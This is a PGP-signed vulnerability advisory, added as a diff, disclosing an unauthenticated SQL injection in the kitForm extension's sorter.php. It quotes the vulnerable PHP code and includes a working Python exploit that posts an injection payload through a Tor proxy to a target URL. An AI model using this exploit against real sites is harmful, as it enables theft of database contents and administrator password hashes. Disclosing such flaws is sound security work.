@@ -1,0 +1,86 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+Happy easter..
+
+* Product: phpManufaktur / kitForm
+* Version: <= 0.43 (2013-11-22)
+* Date: 2014-04-20
+* Criticality: Medium
+* Exploitable from: Remote
+* Impact: SQL Injection
+* Product URL: https://github.com/phpManufaktur/kitForm
+
+1. Vendor Description:
+
+kitForm is an extension for the Customer Relationship Management (CRM)
+KeepInTouch and the Content Management Systems WebsiteBaker or LEPTON
+CMS. It enables the easy creation of forms and dialogs for the CMS and
+the CRM.
+
+2. Vulnerability
+
+A SQL injection error within the sorter.php file can be exploited by
+unauthenticated people to conduct SQL injection attacks. The file does
+not sanitize the "sorter_value" parameter before using the value in a
+SQL query.
+
+A successful exploit can extract database content and e.g.
+administrative credentials (password hash).
+
+22. $sorter_table = $_POST['sorter_table'];
+23. switch ($sorter_table):
+24. case 'mod_kit_form':
+25.  // Frageboegen sortieren
+26.   $rowIDs = implode(',', $_POST['rowID']);
+27.  $sorter_value = $_POST['sorter_value'];
+28.  $SQL = sprintf(  "UPDATE %smod_kit_form_table_sort
+  SET sort_order='%s' WHERE sort_table='%s'
+  AND sort_value='%s'",
+29.  TABLE_PREFIX, $rowIDs, $sorter_table, $sorter_value);
+30.  $database->query($SQL);
+
+3. Exploit
+
+ 1. import httplib2, socks, urllib
+ 2.
+ 3. ### Change these values ###
+ 4. target = "http://fbi.gov"
+ 5. SQLi = "or 1=1 #"
+ 6. tor_http_proxy = 8118
+ 7.
+ 8. httplib2.debuglevel=4
+ 9.
+10. headers = {
+11.  'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1;
+  zh-CN; rv:1.9.1b4) Gecko/20090423 Firefox/3.5b4',
+12.   'Content-Type': 'application/x-www-form-urlencoded'
+13. }
+14. h = httplib2.Http(proxy_info = httplib2.ProxyInfo(
+  socks.PROXY_TYPE_HTTP, '127.0.0.1', tor_http_proxy, timeout=30)
+15.
+16. data = dict(
+17.     rowID = "1",
+18.     sorter_table = "mod_kit_form",
+19.     sorter_value = "AAAA' %s" % SQLi  # <-- injection
+20. )
+21.
+22. resp, content = h.request(
+  "%s" % target, "POST", urllib.urlencode(data), headers=headers)
+23
+24 print resp
+25 print content
+
+xoxo chapp
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.11 (GNU/Linux)
+Comment: Using GnuPG with Thunderbird - http://www.enigmail.net/
+
+iQEcBAEBAgAGBQJTU9cEAAoJECKwmdefSHejw94H/384qa0OpLaF93UNisobw0rl
+pp7Y6xKvfZn2mtYHxCCMzRmV2FngJHYP1L3pMTfB0VesLB49QBrzp5TOVDkvcoBx
+q4D9VOXLxWteedH3S73+plvhKtbQZHAQ74PwY31F2idrzFO10oE4kw6UDDCdpxfq
+Z6JVaJQAym3rDuRD20SAjp0opfP0BmijfNmuothfC9DzEQtzU44vWrac3ZSda+lL
+VKVFr5NvRQ032G0CHvx+WT8yoFPnFxybwYFbW3Exr7QedjrM8eIpf47xgrzytM7i
+sMWpBl/ZqdBkh1LrIin3lKuQgMIeHs+2Rb6Rbep72RKqVxfJy6AXPqhN0804GsU=
+=AylG
+-----END PGP SIGNATURE-----
